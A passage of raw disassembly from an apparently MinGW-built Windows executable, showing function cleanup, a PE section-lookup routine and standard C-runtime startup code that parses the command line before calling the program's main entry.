   140003d37:	41 ff d6             	call   *%r14
   140003d3a:	ba 00 00 00 00       	mov    $0x0,%edx
   140003d3f:	4c 89 e1             	mov    %r12,%rcx
   140003d42:	41 ff d7             	call   *%r15
   140003d45:	4c 89 e1             	mov    %r12,%rcx
   140003d48:	ff d3                	call   *%rbx
   140003d4a:	48 89 f9             	mov    %rdi,%rcx
   140003d4d:	ff d3                	call   *%rbx
   140003d4f:	48 89 f1             	mov    %rsi,%rcx
   140003d52:	ff d3                	call   *%rbx
   140003d54:	48 8d 65 c8          	lea    -0x38(%rbp),%rsp
   140003d58:	5b                   	pop    %rbx
   140003d59:	5e                   	pop    %rsi
   140003d5a:	5f                   	pop    %rdi
   140003d5b:	41 5c                	pop    %r12
   140003d5d:	41 5d                	pop    %r13
   140003d5f:	41 5e                	pop    %r14
   140003d61:	41 5f                	pop    %r15
   140003d63:	5d                   	pop    %rbp
   140003d64:	c3                   	ret
   140003d65:	48 c7 84 24 e4 00 00 	movq   $0x0,0xe4(%rsp)
   140003d6c:	00 00 00 00 00 
   140003d71:	48 c7 84 24 6c 01 00 	movq   $0x0,0x16c(%rsp)
   140003d78:	00 00 00 00 00 
   140003d7d:	48 8d bc 24 e8 00 00 	lea    0xe8(%rsp),%rdi
   140003d84:	00 
   140003d85:	b9 11 00 00 00       	mov    $0x11,%ecx
   140003d8a:	b8 00 00 00 00       	mov    $0x0,%eax
   140003d8f:	f3 48 ab             	rep stos %rax,(%rdi)
   140003d92:	c7 84 24 e0 00 00 00 	movl   $0x94,0xe0(%rsp)
   140003d99:	94 00 00 00 
   140003d9d:	48 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%rcx
   140003da4:	00 
   140003da5:	ff 15 6d 55 00 00    	call   *0x556d(%rip)        # 0x140009318
   140003dab:	44 8b 84 24 e4 00 00 	mov    0xe4(%rsp),%r8d
   140003db2:	00 
   140003db3:	44 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%r9d
   140003dba:	00 
   140003dbb:	8b 84 24 ec 00 00 00 	mov    0xec(%rsp),%eax
   140003dc2:	e9 c0 fb ff ff       	jmp    0x140003987
   140003dc7:	48 89 f9             	mov    %rdi,%rcx
   140003dca:	ff d3                	call   *%rbx
   140003dcc:	e9 90 fd ff ff       	jmp    0x140003b61
   140003dd1:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003dd6:	ff d3                	call   *%rbx
   140003dd8:	48 89 f9             	mov    %rdi,%rcx
   140003ddb:	ff d3                	call   *%rbx
   140003ddd:	e9 7f fd ff ff       	jmp    0x140003b61
   140003de2:	48 89 f1             	mov    %rsi,%rcx
   140003de5:	ff d3                	call   *%rbx
   140003de7:	e9 68 ff ff ff       	jmp    0x140003d54
   140003dec:	48 89 f9             	mov    %rdi,%rcx
   140003def:	ff d3                	call   *%rbx
   140003df1:	48 89 f1             	mov    %rsi,%rcx
   140003df4:	ff d3                	call   *%rbx
   140003df6:	e9 59 ff ff ff       	jmp    0x140003d54
   140003dfb:	90                   	nop
   140003dfc:	90                   	nop
   140003dfd:	90                   	nop
   140003dfe:	90                   	nop
   140003dff:	90                   	nop
   140003e00:	89 d0                	mov    %edx,%eax
   140003e02:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140003e06:	4c 8d 44 11 18       	lea    0x18(%rcx,%rdx,1),%r8
   140003e0b:	0f b7 51 06          	movzwl 0x6(%rcx),%edx
   140003e0f:	66 85 d2             	test   %dx,%dx
   140003e12:	74 31                	je     0x140003e45
   140003e14:	0f b7 d2             	movzwl %dx,%edx
   140003e17:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140003e1b:	49 8d 14 d0          	lea    (%r8,%rdx,8),%rdx
   140003e1f:	eb 09                	jmp    0x140003e2a
   140003e21:	49 83 c0 28          	add    $0x28,%r8
   140003e25:	49 39 d0             	cmp    %rdx,%r8
   140003e28:	74 1b                	je     0x140003e45
   140003e2a:	41 8b 48 0c          	mov    0xc(%r8),%ecx
   140003e2e:	39 c8                	cmp    %ecx,%eax
   140003e30:	72 ef                	jb     0x140003e21
   140003e32:	41 89 ca             	mov    %ecx,%r10d
   140003e35:	45 03 50 10          	add    0x10(%r8),%r10d
   140003e39:	44 39 d0             	cmp    %r10d,%eax
   140003e3c:	73 e3                	jae    0x140003e21
   140003e3e:	41 03 40 14          	add    0x14(%r8),%eax
   140003e42:	29 c8                	sub    %ecx,%eax
   140003e44:	c3                   	ret
   140003e45:	c3                   	ret
   140003e46:	90                   	nop
   140003e47:	90                   	nop
   140003e48:	90                   	nop
   140003e49:	90                   	nop
   140003e4a:	90                   	nop
   140003e4b:	90                   	nop
   140003e4c:	90                   	nop
   140003e4d:	90                   	nop
   140003e4e:	90                   	nop
   140003e4f:	90                   	nop
   140003e50:	55                   	push   %rbp
   140003e51:	57                   	push   %rdi
   140003e52:	56                   	push   %rsi
   140003e53:	53                   	push   %rbx
   140003e54:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140003e5b:	48 8d ac 24 90 00 00 	lea    0x90(%rsp),%rbp
   140003e62:	00 
   140003e63:	31 f6                	xor    %esi,%esi
   140003e65:	e8 e6 d6 ff ff       	call   0x140001550
   140003e6a:	e8 41 e7 ff ff       	call   0x1400025b0
   140003e6f:	48 8b 18             	mov    (%rax),%rbx
   140003e72:	48 85 db             	test   %rbx,%rbx
   140003e75:	75 2c                	jne    0x140003ea3
   140003e77:	e9 9b 00 00 00       	jmp    0x140003f17
   140003e7c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e80:	84 c9                	test   %cl,%cl
   140003e82:	74 4c                	je     0x140003ed0
   140003e84:	83 e6 01             	and    $0x1,%esi
   140003e87:	74 2f                	je     0x140003eb8
   140003e89:	be 01 00 00 00       	mov    $0x1,%esi
   140003e8e:	e8 bd e7 ff ff       	call   0x140002650
   140003e93:	85 c0                	test   %eax,%eax
   140003e95:	74 08                	je     0x140003e9f
   140003e97:	80 7b 01 01          	cmpb   $0x1,0x1(%rbx)
   140003e9b:	48 83 db ff          	sbb    $0xffffffffffffffff,%rbx
   140003e9f:	48 83 c3 01          	add    $0x1,%rbx
   140003ea3:	0f be 0b             	movsbl (%rbx),%ecx
   140003ea6:	80 f9 20             	cmp    $0x20,%cl
   140003ea9:	7e d5                	jle    0x140003e80
   140003eab:	89 f0                	mov    %esi,%eax
   140003ead:	83 f0 01             	xor    $0x1,%eax
   140003eb0:	80 f9 22             	cmp    $0x22,%cl
   140003eb3:	0f 44 f0             	cmove  %eax,%esi
   140003eb6:	eb d6                	jmp    0x140003e8e
   140003eb8:	84 c9                	test   %cl,%cl
   140003eba:	74 14                	je     0x140003ed0
   140003ebc:	0f 1f 40 00          	nopl   0x0(%rax)
   140003ec0:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   140003ec4:	48 83 c3 01          	add    $0x1,%rbx
   140003ec8:	84 c0                	test   %al,%al
   140003eca:	74 04                	je     0x140003ed0
   140003ecc:	3c 20                	cmp    $0x20,%al
   140003ece:	7e f0                	jle    0x140003ec0
   140003ed0:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   140003ed4:	31 c0                	xor    %eax,%eax
   140003ed6:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140003edb:	48 89 d7             	mov    %rdx,%rdi
   140003ede:	f3 48 ab             	rep stos %rax,(%rdi)
   140003ee1:	48 89 d1             	mov    %rdx,%rcx
   140003ee4:	ff 15 1e 54 00 00    	call   *0x541e(%rip)        # 0x140009308
   140003eea:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   140003ef0:	f6 45 cc 01          	testb  $0x1,-0x34(%rbp)
   140003ef4:	74 05                	je     0x140003efb
   140003ef6:	44 0f b7 4d d0       	movzwl -0x30(%rbp),%r9d
   140003efb:	48 8b 0d 0e 15 00 00 	mov    0x150e(%rip),%rcx        # 0x140005410
   140003f02:	49 89 d8             	mov    %rbx,%r8
   140003f05:	31 d2                	xor    %edx,%edx
   140003f07:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140003f0e:	5b                   	pop    %rbx
   140003f0f:	5e                   	pop    %rsi
   140003f10:	5f                   	pop    %rdi
   140003f11:	5d                   	pop    %rbp
   140003f12:	e9 a9 e7 ff ff       	jmp    0x1400026c0
   140003f17:	48 8d 1d 42 11 00 00 	lea    0x1142(%rip),%rbx        # 0x140005060
   140003f1e:	eb b0                	jmp    0x140003ed0
   140003f20:	e9 3b d5 ff ff       	jmp    0x140001460
   140003f25:	90                   	nop
   140003f26:	90                   	nop
   140003f27:	90                   	nop
   140003f28:	90                   	nop
   140003f29:	90                   	nop
   140003f2a:	90                   	nop
   140003f2b:	90                   	nop
   140003f2c:	90                   	nop
   140003f2d:	90                   	nop
   140003f2e:	90                   	nop
   140003f2f:	90                   	nop
   140003f30:	ff                   	(bad)
   140003f31:	ff                   	(bad)
   140003f32:	ff                   	(bad)
   140003f33:	ff                   	(bad)
   140003f34:	ff                   	(bad)
   140003f35:	ff                   	(bad)
   140003f36:	ff                   	(bad)
   140003f37:	ff 20                	jmp    *(%rax)
   140003f39:	3f                   	(bad)
   140003f3a:	00 40 01             	add    %al,0x1(%rax)
	...
   140003f45:	00 00                	add    %al,(%rax)
   140003f47:	00 ff                	add    %bh,%bh
   140003f49:	ff                   	(bad)
   140003f4a:	ff                   	(bad)
   140003f4b:	ff                   	(bad)
   140003f4c:	ff                   	(bad)
   140003f4d:	ff                   	(bad)
   140003f4e:	ff                   	(bad)
   140003f4f:	ff 00                	incl   (%rax)
   140003f51:	00 00                	add    %al,(%rax)
   140003f53:	00 00                	add    %al,(%rax)
   140003f55:	00 00                	add    %al,(%rax)
	...
